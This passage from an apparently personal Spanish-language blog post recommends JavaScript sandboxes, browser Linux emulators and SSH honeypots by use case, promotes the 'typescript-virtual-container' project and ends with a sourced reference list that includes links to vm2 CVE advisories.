→ `isolated-vm`. Verdadero V8 Isolate, límites de memoria estrictos, puente de comunicación explícito. Evita `vm2`: la lista de los CVE no hace más que alargarse, en serio es como una nueva cada pocos meses. Evita `vm`: no es un sandbox en absoluto, por favor.

**Tienes que aislar JS y no quieres extensión nativa, o necesitas compatibilidad navegador.**
→ `quickjs-emscripten`. Frontera Wasm, módulo de unos 500 KB, funciona en los navegadores y Node. Más lento que V8 pero de verdad aislado.

**Tienes que arrancar un verdadero SO Linux sin modificar con compatibilidad binaria.**
→ `v86` para Linux 32-bit, o `container2wasm` si tienes una imagen Docker existente. Acepta 150 MB+ de RAM y 30 segundos de arranque, es el trato. Si necesitas 64-bit, mira CheerpX o usa justo un verdadero runtime de contenedor.

**Tienes que integrar un terminal tipo Linux en una aplicación web sin backend.**
→ `v86` (SO completo, pesado, lento de arrancar) o el bundle navegador de `typescript-virtual-container` (simulador, más ligero, arranque instantáneo, incluye `startxfce4` para un escritorio completo lo cual es bastante guay de hecho).

**Necesitas tutoriales de programación interactivos en línea o un IDE navegador.**
→ WebContainers si estás enfocado en el ecosistema Node.js. CheerpX si necesitas un verdadero userspace Linux. El bundle navegador de `typescript-virtual-container` si quieres una opción más ligera con una API tipada.

**Quieres recolectar TTP de atacantes SSH a gran escala.**
→ Cowrie es el estándar de producción, punto final. Corre en cualquier servidor Linux, se integra con todos los SIEM, ahora tiene un modo LLM. Usa justo Cowrie.

**Quieres datos de honeypot SSH en una aplicación Node.js con una API programable.**
→ `typescript-virtual-container`. Los comandos se ejecutan realmente. El VFS es una verdadera estructura de datos que puedes capturar instantáneamente y diferenciar. El atacante obtiene un entorno interactivo convincente, y tú obtienes datos de auditoría estructurados sin salir de Node.

**Necesitas automatización shell / tests en CI sin Docker.**
→ `typescript-virtual-container`. Arranca en menos de un segundo, instantánea antes de un test, restauración después. Ejecuta comandos shell con una API tipada. Sin demonio Docker, sin núcleo, sin VM, sin espera.

**Necesitas entornos shell multitenant (SaaS, educación, formación).**
→ `typescript-virtual-container`. 5-20 MB por instancia vs. 150-256 MB para un emulador. 100 usuarios simultáneos: ~2 GB vs. ~25 GB. ¡Es una gran diferencia en costes de alojamiento!

**Necesitas un honeypot realista que también te permita construir un laboratorio red multi-VM.**
→ `typescript-virtual-container` es lo único en este espacio que hace ambas cosas.

---

## Lo que no puede hacer (y quiero ser honesto en eso)

No puede ejecutar binarios x86 nativos. Si necesitas compilar código C, ejecutar un verdadero intérprete Python, o usar software compilado para Linux, no hay ABI de núcleo para sostener esas llamadas al sistema. Los comandos como `gcc`, `python3`, y `node` son stubs: responden a `--version` y a las invocaciones comunes, pero no ejecutan nada real.

Es el compromiso fundamental: ganas de 10 a 50 veces menos memoria, un arranque instantáneo, la compatibilidad navegador, una API tipada, verdadero SSH, y red virtual: y abandonas la compatibilidad binaria con el userspace Linux.

Fortune reflexionó mucho sobre eso al diseñar el proyecto. Para los casos de uso que apuntaba: honeypots, tests, terminales embebidos, entornos CI, ejecutar un binario compilado de hecho nunca es necesario. Los pipelines shell, la manipulación de archivos, el ruteo red y SSH cubren todo. Pero si tu caso de uso necesita verdadero software compilado, `v86` o Docker es la buena respuesta, no esto.

---

## Para concluir

Así que eso. Este ecosistema es más amplio y más fragmentado de lo que parece desde fuera. `vm` es un separador de alcance, no un sandbox. `vm2` sigue acumulando CVE (de verdad, mira los avisos de este mes). `isolated-vm` es la buena respuesta para el aislamiento JS pero solo JS. `quickjs-emscripten` es la buena elección cuando necesitas compatibilidad navegador o quieres evitar las extensiones nativas. `v86` y CheerpX son verdaderos emuladores cuando necesitas verdadera compatibilidad binaria. WebContainers es Node.js en Wasm, no un entorno Linux generalista. Cowrie es el patrón oro de los honeypots SSH, pero es Python y no nativo Node.

Y luego está `typescript-virtual-container`: el proyecto de Fortune, que vive un poco en su propia categoría. Ni emulador, ni sandbox JS, ni honeypot pasivo. Algo entre todos que se reveló sorprendentemente útil para muchas cosas que ninguno de los demás puede hacer.

`typescript-virtual-container` llena el hueco que ninguno de los demás toca: un entorno shell Linux completo y programable con verdadero SSH, SFTP, permisos POSIX, gestión de usuarios, red virtual, y una API TypeScript tipada: corriendo en unos 10 MB, arrancando en menos de un segundo, funcionando a la vez en Node.js y el navegador.

Si quieres probarlo: el código fuente está en [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container) y hay una demo en línea (incluyendo `startxfce4` para un escritorio completo, que es francamente enfermizo) en [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo). ¡Ve a verlo y deja unas estrellas a Fortune en GitHub, se las merece!

Gracias por leer: este fue largo incluso para mis estándares :) ¡espero que te sirviera!

---

## Fuentes

Intenté enlazar cada afirmación a una fuente primaria: avisos CVE, docs oficiales, repos GitHub, artículos de blog de los mantenedores. Algunas notas: la lista de los CVE de vm2 sigue alargándose así que el enlace FortiGuard podría estar obsoleto cuando lo leas (mira la página de avisos GitHub para las más recientes). Los enlaces Bellard son todos estables: su sitio personal está ahí desde siempre y el contenido no cambia. Y si quieres profundizar en uno de los polyfills, basta recorrer la carpeta `polyfills/` en el repo `typescript-virtual-container` directamente: es más legible que cualquier descripción que yo pudiera escribir aquí.

### Sandboxes JavaScript

- **Módulo `vm` de Node.js**: documentación oficial: [nodejs.org/api/vm.html](https://nodejs.org/api/vm.html)
- **Advertencia de seguridad `vm` de Node.js**: "El módulo vm no es un mecanismo de seguridad. No lo uses para ejecutar código no fiable": [nodejs.org/api/vm.html#vm-executing-javascript](https://nodejs.org/api/vm.html)
- **`vm2`**: npm: [npmjs.com/package/vm2](https://www.npmjs.com/package/vm2) · GitHub: [github.com/patriksimek/vm2](https://github.com/patriksimek/vm2)
- **Cronología de los CVE vm2**: Alerta FortiGuard con la lista completa de los CVE y fechas: [fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape](https://fortiguard.fortinet.com/outbreak-alert/vm2-sandbox-escape)
- **CVE-2023-29017**: Evasión por error async, GHSA: [github.com/advisories/GHSA-7jxr-cg7f-gpgv](https://github.com/advisories/GHSA-7jxr-cg7f-gpgv)
- **CVE-2023-32314**: Proxy + Error.name + Function escape, gist PoC: [gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac](https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac)
- **CVE-2023-37466**: Entrada Exploit DB con PoC completo: [exploit-db.com/exploits/51898](https://www.exploit-db.com/exploits/51898)
- **CVE vm2 2026**: 11 nuevas evasiones, análisis: [thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956](https://thecybersecguru.com/news/vm2-sandbox-escape-vulnerability-cve-2026-26956) · BleepingComputer: [bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library](https://www.bleepingcomputer.com/news/security/critical-sandbox-escape-flaw-discovered-in-popular-vm2-nodejs-library/)
- **"Why Sandboxing JS in JS is Hard"**: Post-mortem de oxeye.io sobre CVE-2022-36067: [oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067](https://www.oxeye.io/blog/vm2-sandbreak-vulnerability-cve-2022-36067)
- **`isolated-vm`**: npm: [npmjs.com/package/isolated-vm](https://www.npmjs.com/package/isolated-vm) · GitHub: [github.com/laverdet/isolated-vm](https://github.com/laverdet/isolated-vm)
- **Internos V8 Isolate**: Guía de integración: [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **`quickjs-emscripten`**: npm: [npmjs.com/package/quickjs-emscripten](https://www.npmjs.com/package/quickjs-emscripten) · GitHub: [github.com/justjake/quickjs-emscripten](https://github.com/justjake/quickjs-emscripten)
- **`@sebastianwessel/quickjs`**: npm: [npmjs.com/package/@sebastianwessel/quickjs](https://www.npmjs.com/package/@sebastianwessel/quickjs) · GitHub: [github.com/sebastianwessel/quickjs](https://github.com/sebastianwessel/quickjs)
- **Motor QuickJS**: por Fabrice Bellard: [bellard.org/quickjs](https://bellard.org/quickjs/)
- **Modelo de permisos Deno**: docs: [docs.deno.com/runtime/fundamentals/security](https://docs.deno.com/runtime/fundamentals/security/)
- **Salida Deno 2**: Octubre 2024: [deno.com/blog/v2](https://deno.com/blog/v2)
- **Propuesta TC39 ShadowRealm**: [github.com/tc39/proposal-shadowrealm](https://github.com/tc39/proposal-shadowrealm)
- **Propuesta TC39 Compartments**: [github.com/nicolo-ribaudo/tc39-proposal-compartments](https://github.com/nicolo-ribaudo/tc39-proposal-compartments)
- **"Sandboxing JavaScript Code"**: Artículo práctico de Andrew Healey sobre el enfoque de sandbox Deno: [healeycodes.com/sandboxing-javascript-code](https://healeycodes.com/sandboxing-javascript-code)

### Emuladores Linux

- **`v86`**: npm: [npmjs.com/package/v86](https://www.npmjs.com/package/v86) · GitHub: [github.com/copy/v86](https://github.com/copy/v86) · Demo: [copy.sh/v86](https://copy.sh/v86)
- **Matriz de soporte OS v86**: [github.com/copy/v86#operating-system-support](https://github.com/copy/v86)
- **SeaBIOS** (BIOS usado por v86): [seabios.org](https://www.seabios.org/SeaBIOS)
- **Extensiones Bochs VBE** (referencia VGA): [bochs.sourceforge.io](https://bochs.sourceforge.io/)
- **JSLinux**: Emulador de Bellard: [bellard.org/jslinux](https://bellard.org/jslinux/) · Notas técnicas (TinyEMU, histórico, asm.js→Wasm): [bellard.org/jslinux/tech.html](https://bellard.org/jslinux/tech.html)
- **TinyEMU**: Fuente C: [bellard.org/tinyemu](https://bellard.org/tinyemu/) · Espejos GitHub no oficiales: [github.com/yoshijava/TinyEMU](https://github.com/yoshijava/TinyEMU)
- **jor1k**: Emulador JS OpenRISC: [github.com/s-macke/jor1k](https://github.com/s-macke/jor1k) · Demo: [s-macke.github.io/jor1k/demos/main.html](https://s-macke.github.io/jor1k/demos/main.html)
- **CheerpX**: docs: [cheerpx.io/docs/overview](https://cheerpx.io/docs/overview) · Guía pthreads: [cheerpx.io/docs/guides/pthreads](https://cheerpx.io/docs/guides/pthreads)
- **WebContainers**: npm: [npmjs.com/package/@webcontainer/api](https://www.npmjs.com/package/@webcontainer/api) · Docs API: [webcontainers.io](https://webcontainers.io) · Anuncio: [blog.stackblitz.com/posts/webcontainer-api-is-here](https://blog.stackblitz.com/posts/webcontainer-api-is-here/) · Vista previa InfoQ: [infoq.com/news/2021/07/webcontainers-nodejs](https://www.infoq.com/news/2021/07/webcontainers-nodejs/)
- **container2wasm**: GitHub: [github.com/container2wasm/container2wasm](https://github.com/container2wasm/container2wasm) · Artículo de blog NTT: [medium.com/nttlabs/container2wasm-2dd90a18cc9a](https://medium.com/nttlabs/container2wasm-2dd90a18cc9a) · Artículo de Simon Willison: [simonwillison.net/2024/Jan/3/container2wasm](https://simonwillison.net/2024/Jan/3/container2wasm/)

### Stack terminal

- **xterm.js**: npm: [npmjs.com/package/@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm) · GitHub: [github.com/xtermjs/xterm.js](https://github.com/xtermjs/xterm.js) · sitio: [xtermjs.org](https://xtermjs.org)
- **node-pty**: npm: [npmjs.com/package/node-pty](https://www.npmjs.com/package/node-pty) · GitHub (Microsoft): [github.com/microsoft/node-pty](https://github.com/microsoft/node-pty)

### Honeypots

- **Cowrie**: GitHub: [github.com/cowrie/cowrie](https://github.com/cowrie/cowrie) · Docs: [docs.cowrie.org](https://docs.cowrie.org) · Sitio: [cowrie.org](https://www.cowrie.org/)
- **Kippo**: GitHub (archivado): [github.com/desaster/kippo](https://github.com/desaster/kippo)
- **endlessh**: GitHub: [github.com/skeeto/endlessh](https://github.com/skeeto/endlessh)
- **sshesame**: GitHub: [github.com/jaksi/sshesame](https://github.com/jaksi/sshesame)
- **Lyrebird**: Docker Hub: [hub.docker.com/r/lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)
- **node-simple-ssh-honeypot**: Honeypot SSH Node.js mínimo: [github.com/Caesarovich/node-simple-ssh-honeypot](https://github.com/Caesarovich/node-simple-ssh-honeypot)
- **awesome-honeypots**: Lista organizada: [github.com/paralax/awesome-honeypots](https://github.com/paralax/awesome-honeypots)
- **MITRE ATT&CK T1082**: Descubrimiento de información sistema (cómo los atacantes identifican los honeypots): [attack.mitre.org/techniques/T1082](https://attack.mitre.org/techniques/T1082/)

### `typescript-virtual-container`

- **npm**: [npmjs.com/package/typescript-virtual-container](https://www.npmjs.com/package/typescript-virtual-container)
- **GitHub**: [github.com/itsrealfortune/typescript-virtual-container](https://github.com/itsrealfortune/typescript-virtual-container)
- **Demo en línea**: [itsrealfortune.fr/typescript-virtual-container/demo](https://itsrealfortune.fr/typescript-virtual-container/demo)
- **Guía de arquitectura**: [github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md](https://github.com/itsrealfortune/typescript-virtual-container/blob/main/guides/ARCHITECTURE.md)
- **`ssh2`** (implementación del protocolo SSH): npm: [npmjs.com/package/ssh2](https://www.npmjs.com/package/ssh2) · GitHub: [github.com/mscdex/ssh2](https://github.com/mscdex/ssh2)
- **`fflate`** (compresión de las instantáneas VFS): npm: [npmjs.com/package/fflate](https://www.npmjs.com/package/fflate)
- **`ws`** (transporte shell WebSocket): npm: [npmjs.com/package/ws](https://www.npmjs.com/package/ws)

### Lecturas complementarias

- **Modelo de permisos POSIX**: Especificación Open Group: [pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html](https://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap04.html)
- **Write-ahead logging** (patrón usado en la persistencia VFS): [en.wikipedia.org/wiki/Write-ahead_logging](https://en.wikipedia.org/wiki/Write-ahead_logging)
- **Modelo V8 Isolate**: "Embedder's Guide": [v8.dev/docs/embed](https://v8.dev/docs/embed)
- **Especificación ISA RISC-V** (para el contexto TinyEMU/JSLinux): [riscv.org/technical/specifications](https://riscv.org/technical/specifications/)
- **Arquitectura OpenRISC 1000**: [opencores.org/or1k](https://opencores.org/or1k/)
- **"Running Python code in a Pyodide sandbox via Deno"**: Simon Willison TIL, contraste útil con el enfoque Wasm: [til.simonwillison.net](https://til.simonwillison.net/deno/pyodide-sandbox)
- **"Running self-hosted QuickJS in a browser"**: Simon Willison TIL sobre el tamaño del bundle quickjs-emscripten: [til.simonwillison.net/npm/self-hosted-quickjs](https://til.simonwillison.net/npm/self-hosted-quickjs)
